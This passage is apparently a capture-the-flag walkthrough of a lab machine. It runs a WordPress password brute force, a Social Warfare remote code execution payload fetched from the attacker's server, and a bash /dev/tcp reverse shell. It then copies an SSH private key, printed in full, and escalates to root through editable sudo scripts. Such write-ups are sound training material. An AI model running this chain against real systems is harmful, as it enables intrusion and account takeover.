
 | Confirmed By: Login Error Messages (Aggressive Detection)

  

[!] No WPScan API Token given, as a result vulnerability data has not been output.

[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

  

[+] Finished: Mon Jun  5 07:13:11 2023

[+] Requests Done: 3443

[+] Cached Requests: 8

[+] Data Sent: 1.012 MB

[+] Data Received: 1.063 MB

[+] Memory used: 300.09 MB

[+] Elapsed time: 00:01:04

  

So the user max was found. Time to bruteforce (Pentests are great since I can be as loud as possible unlike redteam engagements)

wpscan --url http://192.168.236.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt

.

.

.

[+] Performing password attack on Wp Login against 1 user/s

[!] Valid Combinations Found:

 | Username: max, Password: opensesame

Navigating to http://192.168.236.78/wordpress/wp-admin

login as max:opensesame

I'm in the admin dashboard

now time to install some backdoor plugin but RIP I'm a user and not an admin so I have no install privileges. 

  

Checked the wp-scan site for the two plugins

  

https://wpscan.com/search?text=social-warfare

  

ADDED

  

TITLE

  

2023-01-19

  

Social Warfare < 4.4.0 - Post Meta Deletion via CSRF

  

2023-01-19

  

Social Warfare < 4.3.1 - Subscriber+ Post Meta Deletion

  

2019-04-24

  

Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)

  

2019-03-21

  

Social Warfare <= 3.5.2 - Unauthenticated Arbitrary Settings Update

  

https://wpscan.com/search?text=simple-cart

  

ADDED

  

TITLE

  

2022-02-28

  

Unauthorised AJAX Calls via Freemius

  

So RCE is good to check out. 

  

https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618

  

Description

  

Unauthenticated remote code execution has been discovered in functionality that handles settings import.

  

Proof of Concept

  

1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"

2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt

3. Content of /etc/passwd will be returned 

  

ok so to make the payload then to load up a python server so it can be downloaded (via the lan)

  

echo "<pre>system('cat /etc/passwd')</pre>" > payload.txt

python3 -m http.server 80

  

And my IP is:

inet 192.168.45.233/24 scope global tun0

  

So the payload download URL is 

http://192.168.236.78/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.233/payload.txt

Didn't work so I made a raw pastebin: https://pastebin.com/raw/P6fdTXD4

  

http://192.168.236.78/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://pastebin.com/raw/P6fdTXD4

  

Forgot to add /wordpress/

  

http://192.168.236.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://pastebin.com/raw/P6fdTXD4

  

Pastebin didn't work but a modded version of the first one did

  

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin max:x:1000:1000:roel:/home/max:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash           

No changes made.

  

So now there is the user Steven found from this. Even better is RCE works so now I'll reverse shell

  

Set up listener (I forget to do this if I do it afterwards)

  

Rev shell command is bash -i >& /dev/tcp/192.168.45.233/8080 0>&1 

Better to use well known ports since firewalls will block sketchy looking ones like 7777 etc

  

<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.45.233/8080 0>&1 ")</pre>

  
  

http://192.168.236.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.233/revshell.txt

  

With that I'm in

  

www-data@so-simple:/home/max$ cat local.txt

cat local.txt

dfea93243c595f0d0c53f8837553ea22

www-data@so-simple:/home/max$

  

Now to see if we can get privesc 

  

A route suggested is to check his ssh key privileges since we're in as the www-data user

  

www-data@so-simple:/home/max$ cd .ssh

cd .ssh

www-data@so-simple:/home/max/.ssh$ ls -alt

ls -alt

total 20

drwxr-xr-x 7 max  max  4096 Aug 22  2020 ..

drwxr-xr-x 2 max  max  4096 Jul 14  2020 .

-rw-r--r-- 1 max  max   568 Jul 14  2020 authorized_keys

-rwxr-xr-x 1 root root 2602 Jul 14  2020 id_rsa

-rw-r--r-- 1 root root  568 Jul 14  2020 id_rsa.pub

www-data@so-simple:/home/max/.ssh$cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----

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

-----END OPENSSH PRIVATE KEY-----

pasted the key info into kali/home/.ssh

So using his key I am basically max

  

ssh max@192.168.236.78                                                                                 10:07:50

The authenticity of host '192.168.236.78 (192.168.236.78)' can't be established.

ED25519 key fingerprint is SHA256:+ejHZkFq2lUl66K6hxgfr5b2MoCZzYE8v3yBV3/XseI.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.236.78' (ED25519) to the list of known hosts.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Permissions 0644 for '/home/kali/.ssh/id_rsa' are too open.

It is required that your private key files are NOT accessible by others.

This private key will be ignored.

Load key "/home/kali/.ssh/id_rsa": bad permissions

Make sure to set perms to 700

  

chmod 700 id_rsa

ssh max@192.168.236.78                                                                                  10:09:47

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  

  System information as of Mon Jun  5 14:09:49 UTC 2023

  

  System load:  0.0               Processes:                168

  Usage of /:   53.8% of 8.79GB   Users logged in:          0

  Memory usage: 22%               IPv4 address for docker0: 172.17.0.1

  Swap usage:   0%                IPv4 address for ens160:  192.168.236.78

  

  

47 updates can be installed immediately.

0 of these updates are security updates.

To see these additional updates run: apt list --upgradable

  

  

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

  

max@so-simple:~$    

Ok I'm in now.

  

max@so-simple:/$ cd root/

-bash: cd: root/: Permission denied

Ok so privesc still needed. Checking sudo privileges

  

max@so-simple:/$ sudo -l

Matching Defaults entries for max on so-simple:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User max may run the following commands on so-simple:

    (steven) NOPASSWD: /usr/sbin/service

-     sudo: This is a program for Unix-like computer operating systems that allows users to run programs with the security privileges of another user, by default, the superuser. It is a useful command when you need to run a command with elevated permissions.
    
-     -u steven: This tells sudo to execute the command as user steven.
    
-     /usr/sbin/service: This is a script in Unix-like systems that runs a System V init script in as predictable an environment as possible, removing most environment variables and with the current working directory set to /.
    
-     ../../bin/bash: This is a relative path that seems to be trying to navigate to the bash shell. This is a bit strange because the service command is used to run System V init scripts and is not typically used in conjunction with a command shell like bash.
    

  

Now I'm steven to see what sudo program privileges he has via sudo -l (list commands)

  

steven@so-simple:/$ sudo -l

Matching Defaults entries for steven on so-simple:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User steven may run the following commands on so-simple:

    (root) NOPASSWD: /opt/tools/server-health.sh

Looks like there is a root level command in here to be run. I'll change the script then run it as root.

  

my script basically just opens bash

  

steven@so-simple:/opt/tools$ vi server-health.sh 

#!/bin/bash

bash

steven@so-simple:/opt/tools$ chmod +x server-health.sh

steven@so-simple:/opt/tools$ sudo -u root ./server-health.sh 

root@so-simple:/opt/tools# cd

root@so-simple:~# ls

flag.txt  proof.txt  snap

root@so-simple:~# cat flag.txt 

This is not the flag you're looking for...

root@so-simple:~# cat proof.txt 

2a7679c063977227e74ec78e7a43f807

Boot2Root